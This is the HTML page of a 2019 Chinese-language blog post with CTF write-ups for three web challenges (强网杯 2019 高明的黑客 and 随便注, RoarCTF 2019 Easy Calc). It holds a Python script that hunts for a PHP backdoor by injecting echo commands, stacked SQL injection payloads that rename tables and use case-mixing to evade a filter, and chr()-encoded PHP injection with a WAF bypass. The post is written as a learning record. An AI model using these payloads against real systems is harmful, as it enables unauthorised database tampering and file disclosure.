@@ -1,0 +1,1163 @@
+<!DOCTYPE html>
+
+
+
+
+
+
+
+
+
+
+
+
+  
+
+
+<html class="theme-next pisces use-motion" lang="zh-Hans">
+<head><meta name="generator" content="Hexo 3.9.0">
+  <script src="https://cdn.jsdelivr.net/npm/jquery/dist/jquery.min.js"></script>
+  <script src="https://cuokon.github.io/live2d/autoload.js"></script>
+
+<link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/font-awesome/css/font-awesome.min.css">
+  <meta charset="UTF-8">
+<meta http-equiv="X-UA-Compatible" content="IE=edge">
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=2">
+<meta name="theme-color" content="#222">
+
+
+  <script>
+  (function(i,s,o,g,r,a,m){i["DaoVoiceObject"]=r;i[r]=i[r]||function(){(i[r].q=i[r].q||[]).push(arguments)},i[r].l=1*new Date();a=s.createElement(o),m=s.getElementsByTagName(o)[0];a.async=1;a.src=g;a.charset="utf-8";m.parentNode.insertBefore(a,m)})(window,document,"script",('https:' == document.location.protocol ? 'https:' : 'http:') + "//widget.daovoice.io/widget/0f81ff2f.js","daovoice")
+  daovoice('init', {
+      app_id: "23b069a1"
+    });
+  daovoice('update');
+  </script>
+
+
+
+
+
+
+
+
+
+
+
+
+
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png?v=7.2.0">
+
+
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png?v=7.2.0">
+
+
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png?v=7.2.0">
+
+
+  <link rel="mask-icon" href="/images/logo.svg?v=7.2.0" color="#222">
+
+
+
+
+
+
+<link rel="stylesheet" href="/css/main.css?v=7.2.0">
+
+
+
+
+
+
+<link rel="stylesheet" href="/lib/font-awesome/css/font-awesome.min.css?v=4.7.0">
+
+
+
+
+
+
+  
+  
+  <link rel="stylesheet" href="/lib/fancybox/source/jquery.fancybox.css">
+
+
+
+<script id="hexo.configurations">
+  var NexT = window.NexT || {};
+  var CONFIG = {
+    root: '/',
+    scheme: 'Pisces',
+    version: '7.2.0',
+    sidebar: {"position":"left","display":"post","offset":12,"onmobile":false},
+    back2top: {"enable":true,"sidebar":false,"scrollpercent":true},
+    copycode: {"enable":false,"show_result":false,"style":null},
+    fancybox: true,
+    mediumzoom: false,
+    lazyload: false,
+    pangu: false,
+    algolia: {
+      applicationID: '',
+      apiKey: '',
+      indexName: '',
+      hits: {"per_page":10},
+      labels: {"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}
+    },
+    localsearch: {"enable":true,"trigger":"auto","top_n_per_article":1,"unescape":false,"preload":false},
+    search: {
+      root: '/',
+      path: 'search.xml'
+    },
+    tabs: true,
+    motion: {"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}},
+    translation: {
+      copy_button: '复制',
+      copy_success: '复制成功',
+      copy_failure: '复制失败'
+    }
+  };
+</script>
+
+  <meta name="description" content="[强网杯 2019]高明的黑客访问页面可以看到网站源码备份在 www.tar.gz 那直接访问页面下载就可以了。下载后发现一堆乱七八糟的文件,而且有上千个然后用代码审计工具发现里面有很多文件有可执行命令的函数和其他一些危险的函数初步猜测里面可能是有一个后门,要我们去发现。可是有3千多个文件,而且参数也非常的多,不可能一个一个的去猜测,肯定是要通过脚本去发现后门页面。这里有一个小问题,怎么去判断页面">
+<meta name="keywords" content="ctf,web">
+<meta property="og:type" content="article">
+<meta property="og:title" content="ctf练习(1)">
+<meta property="og:url" content="http://cuokon.github.com/2019/12/10/ctf练习(1)/index.html">
+<meta property="og:site_name" content="错空&#39;s Blog">
+<meta property="og:description" content="[强网杯 2019]高明的黑客访问页面可以看到网站源码备份在 www.tar.gz 那直接访问页面下载就可以了。下载后发现一堆乱七八糟的文件,而且有上千个然后用代码审计工具发现里面有很多文件有可执行命令的函数和其他一些危险的函数初步猜测里面可能是有一个后门,要我们去发现。可是有3千多个文件,而且参数也非常的多,不可能一个一个的去猜测,肯定是要通过脚本去发现后门页面。这里有一个小问题,怎么去判断页面">
+<meta property="og:locale" content="zh-Hans">
+<meta property="og:image" content="http://cuokon.github.com/image/ctf%E7%BB%83%E4%B9%A0(1)/1-1.png">
+<meta property="og:image" content="http://cuokon.github.com/image/ctf%E7%BB%83%E4%B9%A0(1)/1-2.png">
+<meta property="og:image" content="http://cuokon.github.com/image/ctf%E7%BB%83%E4%B9%A0(1)/1-3.png">
+<meta property="og:image" content="http://cuokon.github.com/image/ctf%E7%BB%83%E4%B9%A0(1)/1-4.png">
+<meta property="og:image" content="http://cuokon.github.com/image/ctf%E7%BB%83%E4%B9%A0(1)/1-5.png">
+<meta property="og:image" content="http://cuokon.github.com/image/ctf%E7%BB%83%E4%B9%A0(1)/2-1.png">
+<meta property="og:image" content="http://cuokon.github.com/image/ctf%E7%BB%83%E4%B9%A0(1)/2-2.png">
+<meta property="og:image" content="http://cuokon.github.com/image/ctf%E7%BB%83%E4%B9%A0(1)/2-3.png">
+<meta property="og:image" content="http://cuokon.github.com/image/ctf%E7%BB%83%E4%B9%A0(1)/2-4.png">
+<meta property="og:image" content="http://cuokon.github.com/image/ctf%E7%BB%83%E4%B9%A0(1)/2-5.png">
+<meta property="og:image" content="http://cuokon.github.com/image/ctf%E7%BB%83%E4%B9%A0(1)/2-6.png">
+<meta property="og:image" content="http://cuokon.github.com/image/ctf%E7%BB%83%E4%B9%A0(1)/2-7.png">
+<meta property="og:image" content="http://cuokon.github.com/image/ctf%E7%BB%83%E4%B9%A0(1)/2-8.png">
+<meta property="og:image" content="http://cuokon.github.com/image/ctf%E7%BB%83%E4%B9%A0(1)/2-9.png">
+<meta property="og:image" content="http://cuokon.github.com/image/ctf%E7%BB%83%E4%B9%A0(1)/3-1.png">
+<meta property="og:image" content="http://cuokon.github.com/image/ctf%E7%BB%83%E4%B9%A0(1)/3-2.png">
+<meta property="og:image" content="http://cuokon.github.com/image/ctf%E7%BB%83%E4%B9%A0(1)/3-3.png">
+<meta property="og:image" content="http://cuokon.github.com/image/ctf%E7%BB%83%E4%B9%A0(1)/3-4.png">
+<meta property="og:image" content="http://cuokon.github.com/image/ctf%E7%BB%83%E4%B9%A0(1)/3-5.png">
+<meta property="og:image" content="http://cuokon.github.com/image/ctf%E7%BB%83%E4%B9%A0(1)/3-6.png">
+<meta property="og:updated_time" content="2019-12-11T00:35:29.678Z">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:title" content="ctf练习(1)">
+<meta name="twitter:description" content="[强网杯 2019]高明的黑客访问页面可以看到网站源码备份在 www.tar.gz 那直接访问页面下载就可以了。下载后发现一堆乱七八糟的文件,而且有上千个然后用代码审计工具发现里面有很多文件有可执行命令的函数和其他一些危险的函数初步猜测里面可能是有一个后门,要我们去发现。可是有3千多个文件,而且参数也非常的多,不可能一个一个的去猜测,肯定是要通过脚本去发现后门页面。这里有一个小问题,怎么去判断页面">
+<meta name="twitter:image" content="http://cuokon.github.com/image/ctf%E7%BB%83%E4%B9%A0(1)/1-1.png">
+
+
+
+
+
+  
+  
+  <link rel="canonical" href="http://cuokon.github.com/2019/12/10/ctf练习(1)/">
+
+
+
+<script id="page.configurations">
+  CONFIG.page = {
+    sidebar: "",
+  };
+</script>
+
+  
+  <title>ctf练习(1) | 错空's Blog</title>
+  
+
+
+
+
+
+
+
+
+
+
+
+
+  <noscript>
+  <style>
+  .use-motion .motion-element,
+  .use-motion .brand,
+  .use-motion .menu-item,
+  .sidebar-inner,
+  .use-motion .post-block,
+  .use-motion .pagination,
+  .use-motion .comments,
+  .use-motion .post-header,
+  .use-motion .post-body,
+  .use-motion .collection-title { opacity: initial; }
+
+  .use-motion .logo,
+  .use-motion .site-title,
+  .use-motion .site-subtitle {
+    opacity: initial;
+    top: initial;
+  }
+
+  .use-motion .logo-line-before i { left: initial; }
+  .use-motion .logo-line-after i { right: initial; }
+  </style>
+</noscript>
+
+</head>
+
+<body itemscope itemtype="http://schema.org/WebPage" lang="zh-Hans">
+  
+  
+  
+    
+  
+
+  <div class="container sidebar-position-left page-post-detail">
+    <div class="headband"></div>
+
+    <header id="header" class="header" itemscope itemtype="http://schema.org/WPHeader">
+      <div class="header-inner"><div class="site-brand-wrapper">
+  <div class="site-meta">
+    
+
+    <div class="custom-logo-site-title">
+      <a href="/" class="brand" rel="start">
+        <span class="logo-line-before"><i></i></span>
+        <span class="site-title">错空's Blog</span>
+        <span class="logo-line-after"><i></i></span>
+      </a>
+    </div>
+    
+      
+        <p class="site-subtitle">学无止境</p>
+      
+    
+    
+  </div>
+
+  <div class="site-nav-toggle">
+    <button aria-label="切换导航栏">
+      <span class="btn-bar"></span>
+      <span class="btn-bar"></span>
+      <span class="btn-bar"></span>
+    </button>
+  </div>
+</div>
+
+
+
+<nav class="site-nav">
+  
+    <ul id="menu" class="menu">
+      
+        
+        
+        
+          
+          <li class="menu-item menu-item-home">
+
+    
+    
+      
+    
+
+    
+
+    <a href="/" rel="section"><i class="menu-item-icon fa fa-fw fa-home"></i> <br>首页</a>
+
+  </li>
+        
+        
+        
+          
+          <li class="menu-item menu-item-about">
+
+    
+    
+      
+    
+
+    
+
+    <a href="/about/" rel="section"><i class="menu-item-icon fa fa-fw fa-user"></i> <br>关于</a>
+
+  </li>
+        
+        
+        
+          
+          <li class="menu-item menu-item-tags">
+
+    
+    
+      
+    
+
+    
+
+    <a href="/tags/" rel="section"><i class="menu-item-icon fa fa-fw fa-tags"></i> <br>标签</a>
+
+  </li>
+        
+        
+        
+          
+          <li class="menu-item menu-item-categories">
+
+    
+    
+      
+    
+
+    
+
+    <a href="/categories/" rel="section"><i class="menu-item-icon fa fa-fw fa-th"></i> <br>分类</a>
+
+  </li>
+        
+        
+        
+          
+          <li class="menu-item menu-item-archives">
+
+    
+    
+      
+    
+
+    
+
+    <a href="/archives/" rel="section"><i class="menu-item-icon fa fa-fw fa-archive"></i> <br>归档</a>
+
+  </li>
+
+      
+      
+        <li class="menu-item menu-item-search">
+          <a href="javascript:;" class="popup-trigger">
+          
+            <i class="menu-item-icon fa fa-search fa-fw"></i> <br>搜索</a>
+        </li>
+      
+    </ul>
+  
+
+  
+
+  
+    <div class="site-search">
+      
+  <div class="popup search-popup local-search-popup">
+  <div class="local-search-header clearfix">
+    <span class="search-icon">
+      <i class="fa fa-search"></i>
+    </span>
+    <span class="popup-btn-close">
+      <i class="fa fa-times-circle"></i>
+    </span>
+    <div class="local-search-input-wrapper">
+      <input autocomplete="off" placeholder="搜索..." spellcheck="false" type="text" id="local-search-input">
+    </div>
+  </div>
+  <div id="local-search-result"></div>
+</div>
+
+
+
+    </div>
+  
+</nav>
+
+
+
+</div>
+    </header>
+
+    
+
+
+    <main id="main" class="main">
+      <div class="main-inner">
+        <div class="content-wrap">
+          
+            
+
+          
+          <div id="content" class="content">
+            
+
+  <div id="posts" class="posts-expand">
+      
+
+  
+  
+  
+
+  
+
+  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
+  
+  
+  
+  <div class="post-block">
+    <link itemprop="mainEntityOfPage" href="http://cuokon.github.com/2019/12/10/ctf练习(1)/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="name" content="cuo kon">
+      <meta itemprop="description" content>
+      <meta itemprop="image" content="https://avatars3.githubusercontent.com/u/43626445">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="错空's Blog">
+    </span>
+
+    
+      <header class="post-header">
+
+        
+        
+          <h1 class="post-title" itemprop="name headline">ctf练习(1)
+
+              
+            
+          </h1>
+        
+
+        <div class="post-meta">
+
+          
+          
+          
+
+          
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">发表于</span>
+              
+
+              
+                
+              
+
+              <time title="创建时间：2019-12-10 21:08:35" itemprop="dateCreated datePublished" datetime="2019-12-10T21:08:35+08:00">2019-12-10</time>
+            </span>
+          
+
+          
+            
+
+            
+              <span class="post-meta-item">
+                <span class="post-meta-item-icon">
+                  <i class="fa fa-calendar-check-o"></i>
+                </span>
+                
+                  <span class="post-meta-item-text">更新于</span>
+                
+                <time title="修改时间：2019-12-11 08:35:29" itemprop="dateModified" datetime="2019-12-11T08:35:29+08:00">2019-12-11</time>
+              </span>
+            
+          
+
+          
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="fa fa-folder-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">分类于</span>
+              
+              
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing"><a href="/categories/学习记录/" itemprop="url" rel="index"><span itemprop="name">学习记录</span></a></span>
+
+                
+                
+              
+            </span>
+          
+
+          
+          
+
+          
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="fa fa-eye"></i>
+                 阅读次数： 
+                <span class="busuanzi-value" id="busuanzi_value_page_pv"></span>
+              </span>
+            </span>
+          
+		  
+		  
+          
+
+          <br>
+          
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="fa fa-file-word-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">本文字数：</span>
+              
+              <span title="本文字数">4.3k</span>
+            </span>
+          
+
+          
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="fa fa-clock-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">阅读时长 &asymp;</span>
+              
+              <span title="阅读时长">4 分钟</span>
+            </span>
+          
+
+          
+
+        </div>
+      </header>
+    
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+      
+
+      
+        <h2 id="强网杯-2019-高明的黑客"><a href="#强网杯-2019-高明的黑客" class="headerlink" title="[强网杯 2019]高明的黑客"></a>[强网杯 2019]高明的黑客</h2><p>访问页面<br><img src="../../../../image/ctf%E7%BB%83%E4%B9%A0(1)/1-1.png" alt="1-1"><br>可以看到网站源码备份在 <a href="http://www.tar.gz" target="_blank" rel="noopener">www.tar.gz</a> 那直接访问页面下载就可以了。<br>下载后发现一堆乱七八糟的文件,而且有上千个<br><img src="../../../../image/ctf%E7%BB%83%E4%B9%A0(1)/1-2.png" alt="1-2"><br>然后用代码审计工具发现里面有很多文件有可执行命令的函数和其他一些危险的函数<br><img src="../../../../image/ctf%E7%BB%83%E4%B9%A0(1)/1-3.png" alt="1-3"><br>初步猜测里面可能是有一个后门,要我们去发现。可是有3千多个文件,而且参数也非常的多,不可能一个一个的去猜测,肯定是要通过脚本去发现后门页面。<br>这里有一个小问题,怎么去判断页面是否是有漏洞的页面,我们可以用一个echo 一个标记的东西,在用正则表达式去匹配这个标记,如果匹配到了就代表是那个页面了。用echo原因是不管system函数或者eval函数都是可以得到我们标记的东西。<br>脚本写的比较菜,记得修改路径</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br></pre></td><td class="code"><pre><span class="line">import threading</span><br><span class="line">import requests</span><br><span class="line">import re</span><br><span class="line">import os</span><br><span class="line"></span><br><span class="line">rget = re.compile(r&apos;\$_GET\[[\&apos;&quot;](.*?)[\&apos;&quot;]\]&apos;)</span><br><span class="line">rpost = re.compile(r&apos;\$_POST\[[\&apos;&quot;](.*?)[\&apos;&quot;]\]&apos;)</span><br><span class="line">flag = re.compile(r&apos;&lt;pre&gt;This is Shell (.*?)&lt;/pre&gt;&apos;)</span><br><span class="line">def GetFilename():</span><br><span class="line">	os.chdir(&quot;/root/www/src/&quot;)</span><br><span class="line">	filename = os.listdir(&apos;./&apos;)</span><br><span class="line">	return filename</span><br><span class="line"></span><br><span class="line">def GetParameter(text):</span><br><span class="line">	lget = &apos;&apos;</span><br><span class="line">	lpost = &apos;&apos;</span><br><span class="line">	get = &quot;&quot;</span><br><span class="line">	post = dict()</span><br><span class="line">	lget = rget.findall(text)</span><br><span class="line">	lpost = rpost.findall(text)</span><br><span class="line">	for i in lget:</span><br><span class="line">		get+=i+&apos;=echo &quot;&lt;pre&gt;This is Shell &apos;+i+&apos;&lt;/pre&gt;&quot;&amp;&apos;</span><br><span class="line">	for i in lpost:</span><br><span class="line">		post[i]=&apos;echo &quot;&lt;pre&gt;This is Shell&gt; &apos;+i+&apos;/pre&gt;&quot;&amp;&apos;</span><br><span class="line">	request = [get,post]</span><br><span class="line">	return request</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">def req(filelist):</span><br><span class="line">	 for i in filelist:</span><br><span class="line">	 	with open(i) as f:</span><br><span class="line">                    try:</span><br><span class="line">	 		get,data = GetParameter(f.read())</span><br><span class="line">                        url = &quot;http://89594ab0-1881-42a7-bd87-6c01a1a1f9e3.node3.buuoj.cn/&quot;+i+&apos;?&apos;+get</span><br><span class="line">	 		response = requests.post(url,data=data,timeout=2).text</span><br><span class="line">			result = flag.search(response)</span><br><span class="line">                        if(result):</span><br><span class="line">	 		    print(&apos;-&apos;*40)</span><br><span class="line">                            print(i)</span><br><span class="line">                            print(result.group(1))</span><br><span class="line">                            return</span><br><span class="line">                            </span><br><span class="line">                        else:</span><br><span class="line">                            print(i+&quot;  pass&quot;)</span><br><span class="line">                    except:</span><br><span class="line">                        print(i+&quot; error&quot;)</span><br><span class="line">                        pass</span><br><span class="line">filelist=GetFilename()</span><br><span class="line">req(filelist)</span><br></pre></td></tr></table></figure>
+
+<p>运行脚本后:<br><img src="../../../../image/ctf%E7%BB%83%E4%B9%A0(1)/1-4.png" alt="1-4"><br>得到后就可以查看flag了<br><img src="../../../../image/ctf%E7%BB%83%E4%B9%A0(1)/1-5.png" alt="1-5"></p>
+<h2 id="强网杯-2019-随便注"><a href="#强网杯-2019-随便注" class="headerlink" title="[强网杯 2019]随便注"></a>[强网杯 2019]随便注</h2><p>打开题目<br><img src="../../../../image/ctf%E7%BB%83%E4%B9%A0(1)/2-1.png" alt="2-1"><br>输入一个’看看是否有明显的注入点<br><img src="../../../../image/ctf%E7%BB%83%E4%B9%A0(1)/2-2.png" alt="2-2"><br>直接就报错了,那说明这里肯定有注入点,尝试一下union select<br><img src="../../../../image/ctf%E7%BB%83%E4%B9%A0(1)/2-3.png" alt="2-3"><br>发现被过滤了很多关键的字符,那mysql还有什么关键字是没有被过滤的呢,这里就想到了show这个关键字,可是show关键字只可以查看数据库,所有表列都查询不到,这个问题到下面的时候在详细解决,先把能利用的全部利用上<br>首先查看当前数据库下的所有表,要用联合注入<br><code>1&#39;;show tables#</code><br><img src="../../../../image/ctf%E7%BB%83%E4%B9%A0(1)/2-4.png" alt="2-4"><br>发现了有2个表<br>1.1919810931114514<br>2.words<br>然后查看一下表的结构,这里可以用desc这个关键字,他用来查看表的属性</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1&apos;;desc `1919810931114514`#</span><br></pre></td></tr></table></figure>
+
+<p>可以看到他有1个列flag这个列<br><img src="../../../../image/ctf%E7%BB%83%E4%B9%A0(1)/2-5.png" alt="2-5"><br>然后继续查看words表</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1&apos;;desc `words`#</span><br></pre></td></tr></table></figure>
+
+<p><img src="../../../../image/ctf%E7%BB%83%E4%B9%A0(1)/2-6.png" alt="2-6"><br>words有2个列id和data</p>
+<p>然后通过简单的发现,他用的是words这个表,因为如果用<code>1919810931114514</code>这个表的话就直接把flag查询出来了。那接下来我们可以吧<code>1919810931114514</code>表的属性修改成和<code>words</code>表一样的属性,然后把<code>words</code>重命名为<code>words1</code>,把<code>1919810931114514</code>重命名为<code>words</code>这样他在查询的时候会直接查询到我们的flag。<br>1.先增加<code>1919810931114514</code>的id列<br>2.在把<code>1919810931114514</code>的flag列名重命名为data<br>3.然后修改<code>words</code>的名字,并且修改<code>1919810931114514</code>的名字<br><strong>第三步骤要一次性搞定</strong><br>下面是对应的语句<br>1.添加id列</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1&apos;;alter table `1919810931114514` add id int not null auto_increment primary key#</span><br></pre></td></tr></table></figure>
+
+<p>2.重命名flag列名为data列名</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1&apos;;alter table `1919810931114514` change flag data varchar(100)#</span><br></pre></td></tr></table></figure>
+
+<p>3.对2个数据库进行重命名</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1&apos;;rename table words to words1;rename table `1919810931114514` to words#</span><br></pre></td></tr></table></figure>
+
+<p>依次执行上面语句,可以没执行一个语句就可以用desc去查看是否把表的属性改变成功。<br>最后输入个1就可以查看flag了<br><img src="../../../../image/ctf%E7%BB%83%E4%B9%A0(1)/2-7.png" alt="2-7"><br>另外发现别人的wp还有另外一种方法,非常简单,可以用Mysql预编译去查看flag</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">set @sql=concat(&apos;selec&apos;,&apos;t flag from `1919810931114514`&apos;);</span><br><span class="line">prepare presql from @sql;</span><br><span class="line">execute presql;</span><br><span class="line">deallocate prepare presql;</span><br></pre></td></tr></table></figure>
+
+<p>然后初步的payload</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">0&apos;;set @sql=concat(&apos;selec&apos;,&apos;t flag from `1919810931114514`&apos;);prepare presql from @sql;execute presql;deallocate prepare presql;#</span><br></pre></td></tr></table></figure>
+
+<p>然后发现被strstr被拦截了<br><img src="../../../../image/ctf%E7%BB%83%E4%B9%A0(1)/2-8.png" alt="2-8"><br>因为strstr是对大小写敏感的,所有可以用大小写绕过,最终payload</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">0&apos;;SEt @sql=concat(&apos;selec&apos;,&apos;t flag from `1919810931114514`&apos;);prEpare presql from @sql;execute presql;deallocate PrEpare presql;#</span><br></pre></td></tr></table></figure>
+
+<p><img src="../../../../image/ctf%E7%BB%83%E4%B9%A0(1)/2-9.png" alt="2-9"></p>
+<h2 id="RoarCTF-2019-Easy-Calc"><a href="#RoarCTF-2019-Easy-Calc" class="headerlink" title="[RoarCTF 2019]Easy Calc"></a>[RoarCTF 2019]Easy Calc</h2><p>打开页面<br><img src="../../../../image/ctf%E7%BB%83%E4%B9%A0(1)/3-1.png" alt="3-1"><br>然后提交表单的时候看到calc.php,访问calc.php发现源码<br><img src="../../../../image/ctf%E7%BB%83%E4%B9%A0(1)/3-2.png" alt="3-2"><br>简单来说就是过滤了一些符号,然后只要没有出现那些符号就可以执行命令,其实如果是这样的话就很简单了,可惜事与愿违<br><img src="../../../../image/ctf%E7%BB%83%E4%B9%A0(1)/3-3.png" alt="3-3"><br>他用了waf之类的防护软件,然后看了别人的wp才知道可以在?后面加个空格然后在接参数,然后就可以绕过waf,主要原理是waf认为我们传入的参数是<code>num</code>,不是waf要拦截的<code>num</code>,然后php接收的时候还是num所以我们就可以通过这样绕过。<br><img src="../../../../image/ctf%E7%BB%83%E4%B9%A0(1)/3-4.png" alt="3-4"><br>然后因为他disable_functions过滤了大部分参数,不过我们还有scandir这个函数,我们可以用这个函数去查看flag在哪里,可是因为我们不能输入单引号和双引号,这里我们可以用chr函数把字符的ascii码变成字符,最后在根目录发现flag<br>payload</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://node3.buuoj.cn:27455/calc.php?%20num=1;print_r(scandir(chr(46).chr(47).chr(46).chr(46).chr(47).chr(46).chr(46).chr(47).chr(46).chr(46).chr(47)))</span><br></pre></td></tr></table></figure>
+
+<p><img src="../../../../image/ctf%E7%BB%83%E4%B9%A0(1)/3-5.png" alt="3-5"><br>然后后show_source来读取f1agg ,payload</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://node3.buuoj.cn:27455/calc.php?%20num=1;show_source(chr(46).chr(47).chr(46).chr(46).chr(47).chr(46).chr(46).chr(47).chr(46).chr(46).chr(47).chr(102).chr(49).chr(97).chr(103).chr(103));</span><br></pre></td></tr></table></figure>
+
+<p><img src="../../../../image/ctf%E7%BB%83%E4%B9%A0(1)/3-6.png" alt="3-6"></p>
+
+      
+    </div>
+
+    
+
+    
+      
+    
+
+    
+    
+    
+
+
+
+    
+    
+
+    
+      
+    
+    
+
+    
+      <div>
+        
+
+
+
+
+  
+
+
+
+<ul class="post-copyright">
+  <li class="post-copyright-author">
+    <strong>本文作者： </strong>cuo kon</li>
+  <li class="post-copyright-link">
+    <strong>本文链接：</strong>
+    
+    <a href="http://cuokon.github.com/2019/12/10/ctf练习(1)/" title="ctf练习(1)">http://cuokon.github.com/2019/12/10/ctf练习(1)/</a>
+  </li>
+  <li class="post-copyright-license">
+    <strong>版权声明： </strong>本博客所有文章除特别声明外，均采用 <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/" rel="noopener" target="_blank"><i class="fa fa-fw fa-creative-commons"></i>BY-NC-SA</a> 许可协议。转载请注明出处！</li>
+</ul>
+
+      </div>
+    
+
+    <footer class="post-footer">
+      
+        
+          
+        
+        <div class="post-tags">
+          
+            <a href="/tags/ctf/" rel="tag"># ctf</a>
+          
+            <a href="/tags/web/" rel="tag"># web</a>
+          
+        </div>
+      
+
+      
+      
+      
+
+      
+        <div class="post-nav">
+          <div class="post-nav-next post-nav-item">
+            
+              <a href="/2019/12/09/udf提权/" rel="next" title="utf提权">
+                <i class="fa fa-chevron-left"></i> utf提权
+              </a>
+            
+          </div>
+
+          <span class="post-nav-divider"></span>
+
+          <div class="post-nav-prev post-nav-item">
+            
+          </div>
+        </div>
+      
+
+      
+      
+    </footer>
+  </div>
+  
+  
+  
+  </article>
+
+  </div>
+
+
+          </div>
+          
+  
+    
+    
+  <div class="comments" id="comments">
+    <div id="lv-container" data-id="city" data-uid="MTAyMC80NTY1Ni8yMjE2Nw=="></div>
+  </div>
+  
+  
+
+
+
+        </div>
+        
+          
+  
+  <div class="sidebar-toggle">
+    <div class="sidebar-toggle-line-wrap">
+      <span class="sidebar-toggle-line sidebar-toggle-line-first"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-middle"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-last"></span>
+    </div>
+  </div>
+
+  <aside id="sidebar" class="sidebar">
+    <div class="sidebar-inner">
+
+      
+
+      
+        <ul class="sidebar-nav motion-element">
+          <li class="sidebar-nav-toc sidebar-nav-active" data-target="post-toc-wrap">
+            文章目录
+          </li>
+          <li class="sidebar-nav-overview" data-target="site-overview-wrap">
+            站点概览
+          </li>
+        </ul>
+      
+
+      <div class="site-overview-wrap sidebar-panel">
+        <div class="site-overview">
+
+          <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
+  
+    <img class="site-author-image" itemprop="image" src="https://avatars3.githubusercontent.com/u/43626445" alt="cuo kon">
+  
+  <p class="site-author-name" itemprop="name">cuo kon</p>
+  <div class="site-description motion-element" itemprop="description"></div>
+</div>
+
+
+  <nav class="site-state motion-element">
+    
+      <div class="site-state-item site-state-posts">
+        
+          <a href="/archives/">
+        
+          <span class="site-state-item-count">15</span>
+          <span class="site-state-item-name">日志</span>
+        </a>
+      </div>
+    
+
+    
+      
+      
+      <div class="site-state-item site-state-categories">
+        
+          
+            <a href="/categories/">
+          
+        
+        
+        
+          
+        
+          
+        
+          
+        
+        <span class="site-state-item-count">3</span>
+        <span class="site-state-item-name">分类</span>
+        </a>
+      </div>
+    
+
+    
+      
+      
+      <div class="site-state-item site-state-tags">
+        
+          
+            <a href="/tags/">
+          
+        
+        
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+        <span class="site-state-item-count">14</span>
+        <span class="site-state-item-name">标签</span>
+        </a>
+      </div>
+    
+  </nav>
+
+
+
+
+
+
+
+  <div class="links-of-author motion-element">
+    
+      <span class="links-of-author-item">
+      
+      
+        
+      
+      
+        
+      
